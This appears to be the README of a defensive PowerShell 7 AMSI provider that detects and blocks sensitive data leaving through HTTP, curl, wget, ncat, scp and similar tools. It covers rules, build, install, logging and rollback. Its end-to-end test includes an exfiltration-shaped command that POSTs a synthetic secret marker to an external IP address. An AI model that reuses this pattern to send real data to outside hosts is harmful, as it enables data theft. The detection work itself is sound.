# PowerShell 7 Guard（Windows x64 / v0.1）

Guard 在 PowerShell 7 的 AMSI 扫描中追踪 **敏感来源 → 变量、文件或管道 → 发送目标**。AMSI 源码、AST、Runspace 状态和进程上下文用于当场判定；日志异步写入。基线是微软 [Windows-classic-samples / AmsiProvider](https://github.com/microsoft/Windows-classic-samples/tree/434f6002bdf9cf9829406c3ff2b33387982d6168/Samples/AmsiProvider)。原件和许可证保留在 `upstream/`。

| 情况 | 本 Provider 的结果 |
| --- | --- |
| 已确认外发输入命中配置中的 `block` 规则 | `0x4000`（管理策略阻断），日志显示规则编号、原始来源、传递路径和发送目标 |
| 目标是本机回环（`127.0.0.0/8`、`::1` 或 `localhost`） | 默认检查。只有在 `[policy]` 显式设置 `trust_loopback = true` 才有回环例外；别的局域网主机不享受例外；PowerShell HTTP 命令还须禁用重定向（`-MaximumRedirection 0`），且没有显式代理或会话对象 |
| 命中 `warn` 规则、下载、本地传播或未命中 | `0x0001`（本 Provider 不阻断），其他 Provider 仍可判定 |
| 发送输入、来源或目标缺失，或者命令不在已覆盖范围 | 只警告或标为未覆盖，返回 `0x0001`；不把未覆盖当作已审查 |
| AMSI 应用标识不是 `pwsh.exe` 主版本 7 | 跳过，不读正文 |

应用标识通过两次 `GetAttribute()` 查询长度并读取，不再受 1024 字符固定缓冲区限制。应用标识长度上限为 128 KiB（含 NUL，脚本块上限由策略配置）；读取失败或格式无效时记录 `missing:app-name`，并交还 AMSI，不读取正文。

规则所需信息缺失时，记录 `Warning: Information missing`，详细原因用 `missing:...` 表示。本 Provider 返回 `0x0001`，不阻断，也不把这次扫描记作已检查且无命中。

### 配置规则

编辑 `config/sensitive.toml`。每个 `[[rules]]` 有唯一的 `id`、`action = "block"` 或 `"warn"`，以及 `files`、`folders`、`texts` 三个字符串列表。Windows 路径建议用 TOML 单引号（反斜杠不用转义）；相对配置路径以 TOML 所在目录为起点。文本按大小写精确查找。随附的合成标记只是默认示例，用户可以直接替换或新增规则。Guard 只在确认写入成功后，把派生文件登记到对应规则的 `[[rules.copy]]`，把 User/Machine 环境变量的敏感元数据登记到 `state/persistent-variables.toml`；不保存变量值。

已接入常见的文件读取、复制和写入，以及 PowerShell HTTP、`curl`、`wget`、`scp`、OpenSSH `sftp`、`ncat`、BITS 和显式 UNC 目标的常见传输。规则分析实际选中的请求字段、文件或标准输入，不抓包，也不据此断言传输成功。见[网络传输清单](docs/network-coverage.md)、[三类读取的命令清单](docs/read-coverage.md)及[规则设计](docs/sensitive-flow-design.md)。

对整文件上传，先用文件句柄确认路径、匹配配置的文件或目录。路径已经决定处置时，不再为了证明该来源读取或解压正文；这不代表正文已检查。若仅命中路径警告且另有阻断型文本规则，仍检查正文。需要解析文本、取指定行或实际字节的操作仍按需读取。

普通 ZIP/GZIP 可在大小和层数上限内检查，不会把内容解压到磁盘。确定的 Base64 和常见 UTF 编码可沿来源继续匹配；损坏或不支持的格式会标记信息缺失。已加载的自带 `Compress-Archive` 在确认输出内容后登记敏感副本。

在同一个 ScriptBlock 中，分支汇合保留各条可达路径已确认的来源。文件复制、移动、覆盖和追加会更新后续读取的预测。循环、JSON 数组和 OutVariable 超过物化预算时，结果可以带有敏感来源和信息缺失原因。

`[policy]` 集中配置 AMSI 和脚本输入字节数、语句数、表达式深度、文件检查、循环、JSON 和捕获记录的预算。AMSI 输入和脚本按 UTF-16 字节计数。文件数量、单文件字节数和总文件字节数可以设为 0，表示取消该项限制。各项默认值见 [策略配置](config/sensitive.toml)。

未知命令的输出按当前管道的信息缺失处理。后续显式读取和枚举文件会重新检查。脚本内定义的普通函数在调用点绑定参数并分析函数体。文件系统枚举的 `-Name` 输出名称字符串，`-Recurse -FollowSymlink` 在本地固定磁盘范围内跟随链接。

文件句柄、文件内容和元数据是三种不同的值。打开文件、列出 ZIP 成员或取得流长度本身都不是发送正文。常见的 .NET 文件流、文本读取器和二进制读取器按读取位置选择内容；三参数 `Read` 写入缓冲区，返回的是数量。`StreamReader` 预读后不猜测底层字节位置；不支持的重载、超预算和相互冲突的异步读取保留信息缺失。ZIP 成员名与成员数据分开追踪，`Expand-Archive` 仅预测本地路径和后续可读内容，扫描器不往目标目录解压。

规则的可选 `sources` 数组可以按来源匹配本地数据。选择器如 `clipboard`、`registry:HKEY_CURRENT_USER\Software\Example#Name`、`eventlog:Application#Message`、`cim:root\cimv2/Win32_OperatingSystem#Caption`、`env:NAME`、`env:user:NAME`、`acl:C:\Data\report.txt#Owner`；名称忽略大小写，省略字段名表示匹配整个来源。注册表、剪贴板、事件日志、CIM 和 ACL 的读取适配器不查询这些系统服务。规则命中说明所选来源被标记，不证明已取得实际内容。

| 读取类型 | 常见形式和边界 |
|---|---|
| 文本选择 | `sed` 的选行、打印、删除和字面替换，`awk` 的行号条件、字段和计数，`jq` 的字段、索引、迭代及 `-r/-c`。静态解析选中的值；不执行过滤脚本、加载模块或启动外部程序。 |
| 文件和结构化数据 | `xxd` 的普通十六进制转储和 `-p`；`Get-Item -Stream` 读取流名、长度，`Get-Content -Stream` 只检查指定本地数据流。XML 文档、`Import-LocalizedData` 的纯数据文件、`ConvertFrom-StringData` 走有界解析；不解析外部 XML 实体。 |
| 系统数据 | 显式枚举进程环境时，在预算内采集名称；`-Name` 不读取变量值。命名变量、`reg query`、注册表 API 和 `wevtutil qe` 保留各自来源。用户/机器环境的整表查询仅返回配置中已知的候选来源及未知余项。 |
| 投影和摘要 | `ForEach-Object -MemberName` 和 `Select-Object` 按属性传递来源。`Get-Acl` 不将描述符当成文件正文；`certutil -hashfile` 和 `Get-FileHash` 不为分析而计算摘要。 |
| 字节与多文件正文 | `Get-Content -AsByteStream` 区分逐个 Byte、`-ReadCount` 分组和 `-Raw` 的 byte[]。`-TotalCount`、`-Tail` 对非 Raw 字节记录按字节选段。超过对象预算时保留前缀、记录数和未知余项；若所选字节仍在字节预算内，原生 stdin 可以按原字节检查。多个 `-Raw` 文件保留记录顺序和中间的未知位置。 |
| 管道 JSON | `Get-Content` 按行输出时，`ConvertFrom-Json` 区分逐记录 JSON 和合并多行的一份文档。遇到未知片段、顺序不确定或无法归属到字段的混合来源时，不把合并结果当作完整对象。 |
| 目录路径 | `Get-Location` 区分 PowerShell 驱动器显示路径与文件系统路径。`[IO.Directory]::GetFiles/GetDirectories/GetFileSystemEntries` 输出路径字符串，不读正文。`Enumerate*` 在后续路径选择、迭代或索引时枚举。只接受受限本地绝对路径与支持的筛选；递归或预测写入改变的顺序不作为精确索引。 |
| 本机会话与系统 | `Get-History`、`Read-Host` 普通文本、`Get-Process`、`Get-Service`、`Get-ComputerInfo`、`Get-NetIPConfiguration` 的本地形式用来源描述输出，不查询服务或弹出输入框。选择器例如 `session:history#CommandLine`、`session:input`、`system:process#Path`。本地只读的 `tasklist`、`systeminfo`、`hostname`、`whoami`、`ipconfig` 按各自的文本报告来源建模（如 `system:tasklist`），不假造报告。支持 `printenv` 和 `cmd /c set` 的查询形式。 |
| 原生文本和计数 | `uniq` 区分连续相同的行，`nl` 按选定样式编号；原生 `sort` 保留成员，不在区域设置未知时猜顺序。PowerShell 的标准 `sort` 别名仍解析为 `Sort-Object`。`wc -c` 查询文件大小而不读正文；`wc -l` 统计换行字节，ASCII 范围内还可统计词、字符和列宽。计数不继承正文标签。 |
| 可打印字符串和字节转储 | `strings`、`strings64`、`strings64a` 按已识别的方言、最短长度和编码选取字符；默认方言、对象节或输出布局不明确时保留缺失原因。`hexdump -C`（含 `hd`）区分十六进制列、字符栏、重复行和尾偏移；`od` 支持常见进制、单元宽度、跳过和长度。仅从实际输出的文本或所选字节来源建立标签。 |
| 原生归档 | `tar`/`bsdtar`、`7z`/`7za`/`7zz`、`unzip`/`zipinfo` 分开建模列成员、向标准输出提取和预测本地解压。`unzip -p` 输出成员内容，`zipinfo -1` 输出成员名。7z 仅解码受支持的 Copy、LZMA、LZMA2 文件夹。未知编解码器、加密、特殊成员、预算和本地化显示均可能产生信息缺失。 |
| 独立解压 | `gzip -dc`、`gunzip`、`zcat`；`bzip2 -dc`、`bunzip2`、`bzcat`；`xz -dc`、`unxz`、`xzcat`。显式输入按格式和预算解析，stdout 与对目标文件的预测分开。`tar -z/-j/-J` 复用同一层解码。XZ 限单 LZMA2 过滤器及无校验、CRC32、CRC64；旧式随机化 bzip2 块不解析。扫描不运行上述工具、不写解压目标。 |
| .NET 定位与异步读取 | `Stream.ReadExactly` 更新缓冲区，不返回正文；`ReadAtLeast` 区分保证读到的前缀和可能短读的余项。`RandomAccess.Read` 从显式偏移读入缓冲区，不移动流位置。`File.ReadLinesAsync` 返回异步序列；由已建模的 `GetAsyncEnumerator()` 和等待 `MoveNextAsync()` 后的 `Current` 提供行，而不是把序列对象视作全文。 |

.NET HTTP 分析会检查请求头、表单字段、multipart 文件和请求流中的连续写入。资源预算位于 `config/sensitive.toml` 的 `[policy]`，其中 `max_state_file_bytes` 约束配置和持久化变量文件，`max_git_proof_bytes` 单独约束 Git 证明。

Git 推送预检在独立命令中检查候选本地引用的可达历史。预检脚本的 `-Remote` 接受远端名称或显式网络 URL，`-Refspec HEAD` 绑定到当前分支。推送加上 `--force-with-lease` 也会核对同一组源引用。

预检脚本的 `-Repository` 对应 Git 的工作目录，`-All`、`-Tags` 和 `-FollowTags` 对应同名的推送选项。

~~~powershell
& 'D:\ctf-ai\powershell7guard\scripts\Prepare-GuardGitPush.ps1' -Remote origin -Refspec main
# git push origin（只指定远端）：
& 'D:\ctf-ai\powershell7guard\scripts\Prepare-GuardGitPush.ps1' -Remote origin
# 普通 git push 的预检（分别选择其中一种用法）：
& 'D:\ctf-ai\powershell7guard\scripts\Prepare-GuardGitPush.ps1'
~~~

预检只对同仓库、同参数并且规则、Git 配置和源引用未变的推送有效。有效期由 `git_proof_lifetime_seconds` 配置，默认 60 秒。没有有效预检则只记录 `Warning: Information missing`。预检覆盖的历史包含远端可能已经拥有的对象。这些历史中的敏感内容也可能触发阻断。批量推送还会重新核对本地分支和标签清单。

### 构建并离线验证

在工作区根目录运行（VS 2026 C++ 工具链、Windows SDK、CMake、.NET SDK、Rust/Cargo、PowerShell 7 x64；VS 2022 可使用生成器 `Visual Studio 17 2022`）：

~~~powershell
cmake -S . -B build -G 'Visual Studio 18 2026' -A x64
cmake --build build --config Release
ctest --test-dir build -C Release --output-on-failure
~~~

验收程序直接调用 DLL 的 `Scan`，并使用真实的本地 PowerShell Runspace 验证规则、状态和发送判定。Git 用本地裸仓库验证待推送历史，不执行推送。测试不接触外网、不注册 DLL。回滚预检只读取本 Provider 的注册键。结果见 `VERIFICATION.txt`。

### 在 Windows 测试虚拟机做端到端验证

在测试虚拟机里，以管理员身份打开 PowerShell 7 x64，在工作区运行下面一条命令。脚本部署并注册固定名称 `Program Files\PowerShell7Guard\PowerShell7Guard.dll`。更新时覆盖同一文件，不加版本后缀、不留备份，也不要求先卸载。如果旧 PowerShell 正占用文件，关闭对应窗口后重跑。新版注册成功后会尝试清理旧版遗留文件。现有安全产品和签名策略保持不变。

~~~powershell
.\scripts\Install-Guard.ps1
~~~

看到 `Registered` 后，新开 PowerShell 7，直接用合成标记运行：

~~~powershell
Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -Body 'PS7GUARD_TEST_SECRET'
~~~

在日志中找到本次命令的 AMSI 事件，再看规则判定。出现 `ScriptHasAdminBlockedContent` 且事件判定为阻断，才算通过阻断验收；服务器是否监听不影响这一判定。

`Test-PowerShell7.ps1 -Target <地址> -Live` 执行真实命令并只核对 PowerShell 错误和对应日志。省略 `-Live` 只编译 ScriptBlock，不发请求。

### 查看日志

在普通 PowerShell 7 窗口照常执行命令。Provider 和查看器默认都使用构建时确定的项目路径 `logs\events.jsonl`。在本机就是 `D:\ctf-ai\powershell7guard\logs\events.jsonl`。不会按宿主的 `LocalAppData` 拆分，也不会在写入失败时回退到其他日志文件。沿用目录现有权限，不更改 ACL；若宿主无权写这个项目目录，本次日志写入失败不影响判定。无需启动 ETW、观察器或额外窗口。在项目目录运行：

~~~powershell
.\build\Release\guard-log.exe
.\build\Release\guard-log.exe --debug
~~~

默认先显示最近 20 条，之后持续跟踪，只输出新增的完整记录。日志还没创建时会等待；清理旧记录后也不会重复输出保留的记录。按 Ctrl+C 退出。`--debug` 逐字段展开完整信息（包括源码），空值不打印。`--tail 5`、`--all` 选择启动时显示多少历史记录，`--file 路径` 选择日志，`--once` 只读取一次。**日志含明文脚本、路径和启动参数**，请勿随意分享。`logs/` 不纳入 Git。

- `process`：PID/TID、父 PID、映像、启动参数、当前目录、用户 SID/名称、提升与完整性级别、Windows 会话、进程架构和创建时间。父映像/创建时间核对 PID 复用；父命令行由观察器按权限尽力补齐，无法读取时为 `null`。固定进程字段在 DLL 后台线程首次采集后缓存；当前目录按扫描读取 Win32 进程目录，未必等于 PowerShell 的 `Get-Location`。
- `amsi`：应用名、来源名、长度、读取方式、进程内会话号、扫描序号和源码。属性缺失或超过配置的 AMSI 输入上限时，不伪造内容。重定向链和整体缓冲区属性、`QUIET` 按预期类型尝试读取；不支持时省略。地址只报告有无，不输出或解引用可选地址；不输出原始会话句柄。
- `ast`：在 `Scan()` 内使用宿主的 PowerShell AST 提取命令/参数、静态文件路径、URL/IP/域名候选、管道、变量、字符串、动态执行、外部命令候选、编码调用和解析错误。AST 不执行脚本；需要的实时标量由下面的 Runspace 读取路径提供。`ast.policy` 记录规则结果、证据和待确认写入。为避免解析时装载外部程序集或模块，含 `using` 指令特征的源码跳过 AST；桥接不可用且识别到可能的外发时，只记录信息缺失。`NotDetected` 只表示本 Provider 未阻断，不等于其他安全产品已放行。

判定在 `Scan()` 内完成，随后由后台线程写文件。只保留一个最多 5 MiB 的日志；满后丢弃最旧的记录，不创建轮转备份。待处理记录最多 32 条；队列满或写入失败不影响拦截。`scanSequence` 和 `dropped` 可用来识别日志缺口。

### 跨 ScriptBlock 的变量状态

- 每个本地 Runspace 有自己的一张状态表，最多缓存 64 个会话级变量。扫描只处理当前源码引用的名称；全局变量或顶层会话变量优先命中状态表，首次遇到或失效时才查询运行时。环境变量只查询脚本直接引用的 `$env:...`，不逐次枚举进程环境。
- AST 记录赋值依赖和候选来源；规则可核对确定的本地文件，检查有大小和路径边界，不为动态输入遍历目录。命令目标被会话函数或别名改变、且无法确认时，不按同名内置命令拦截。
- 发现当前管道时，监听其完成事件。管道结束后只回读已识别、仍可见的赋值目标；成功时更新表。未知副作用（包括自定义 `prompt`）使已有条目待核对，不会清空表。后续只核对引用的条目：没变保留原来源，值变了按实际值更新、丢弃旧来源，已删除的条目移除。HTTP 规则使用缓存输入时，不会用未经核对的旧值拦截。调试日志中，`cacheHits` 包含核对后确认不变的命中；`cacheRevalidations` 和 `runtimeReads` 分别列出缓存核对次数和实际查询次数。
- `guard-log.exe --debug` 在 `AST / 变量数据流` 下显示读取来源、依赖、敏感标记及前序的实际观察结果。实际标量值保存在进程内，日志不额外输出 Runspace 或环境变量值；既有脚本源码明文日志不变。

当宿主未提供可关联的本地 Runspace/管道时，这项功能按缺失处理；旧 PowerShell 版本的内部接口如果不兼容也会退化。此表不是所有 PowerShell 语义的追踪器：自定义 getter、复杂对象、间接赋值、已退出函数作用域和宿主任意 API 修改不保证可观察。

### 回滚

~~~powershell
.\scripts\Uninstall-Guard.ps1
~~~

卸载脚本自动注销本 Provider、删除部署副本，然后清理空目录。它不动工作区构建产物或其他 Provider。如果 DLL 仍被旧 PowerShell 窗口占用，关闭那些窗口后再运行一次卸载。原版文件保留在 `upstream/`；早期补丁按当时的目录结构保存。

### 外部命令适配器

项目源码统一放在 `src/`：

- `src/provider/`：原生 AMSI Provider、Windows 桥接和日志。
- `src/analysis/`：PowerShell AST、变量状态、数据流和敏感规则。
- `src/analysis/adapters/`：外部命令适配器。
- `src/loader/`：内嵌 .NET 加载器。
- `src/reader/`：Rust 日志阅读器。

PowerShell AST 和变量、文件、管道的数据来源仍由通用层解析。独立适配器负责 curl 的请求体、表单、请求头、文件和标准输入，GNU Wget 的 POST、自定义方法请求体和下载输出，以及 OpenSSH scp 的源、目的地和受限递归目录。流量判定仍使用同一套规则。静默、超时及下载输出参数不当作上传内容；例如 curl 的 `--config` 已知代表外部参数文件，但暂不展开该文件。
